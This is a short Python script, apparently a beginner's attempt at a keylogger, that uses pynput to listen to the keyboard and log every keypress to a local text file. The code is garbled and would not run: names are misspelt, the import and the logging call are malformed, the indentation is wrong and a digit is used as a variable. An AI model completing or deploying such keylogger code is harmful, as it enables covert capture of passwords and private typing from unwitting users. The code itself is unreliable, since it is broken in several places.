from pynput.keyborad import Key Lstener
import logging

text=""

loggging.basicConfig(filename=(text+"keyboaraddat.txt"),logging.DEBUG,format="%(message)s"

                     def on_press(key):
                         logging.info(str(key))
                         
                     with Listener(on_press=on_press) as 1:
                         1.join()

                    
